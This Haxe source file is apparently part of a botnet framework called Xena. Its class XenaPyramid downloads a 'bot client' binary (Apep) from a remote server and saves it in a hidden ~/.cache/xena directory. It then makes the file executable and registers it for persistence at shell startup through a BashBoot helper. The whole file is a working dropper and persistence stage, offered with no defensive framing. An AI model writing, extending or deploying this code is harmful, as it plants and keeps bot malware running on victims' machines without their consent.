package app.services;

import sys.io.File;
import app.services.BashBoot;
import sys.FileSystem;
import sys.io.Process;

class XenaPyramid {
  private final remote: String;

  public function new (remote: String) {
    this.remote = remote;
  }

  /**
    Download, save and persist bot clients.
    It supports only Apep at the moment,
    but it can be extended.
  **/
  public function grabAndSave (buildProfileId: String) {
    final request: sys.Http = new sys.Http(this.remote + '/v1/builds?buildProfileId=52c93c88-c5b7-435f-8212-80c6af7c3ad8');

    request.onBytes = function (data: haxe.io.Bytes) {
      trace(data.length);

      final bashBoot: BashBoot = new BashBoot();

      final dest = '/home/${bashBoot.uname}/.cache/xena';

      try {
        FileSystem.createDirectory(dest);
      } catch (e) {
        trace(e.message);
      }
      
      try {
        new Process('touch ${dest}/apep');
      } catch (e) {
        trace(e.message);

        try {
          new Process('cat > ${dest}/apep');
        } catch (e) {
          trace(e.message);
        }
      }

      File.write('${dest}/apep');

      File.saveBytes('${dest}/apep', data);

      new Process('chmod +x ${dest}/apep');

      if (bashBoot.check())
        bashBoot.set('${dest}/', 'apep');
    }

    request.onError = function (error: String) trace(error);

    request.request(false);
  }
}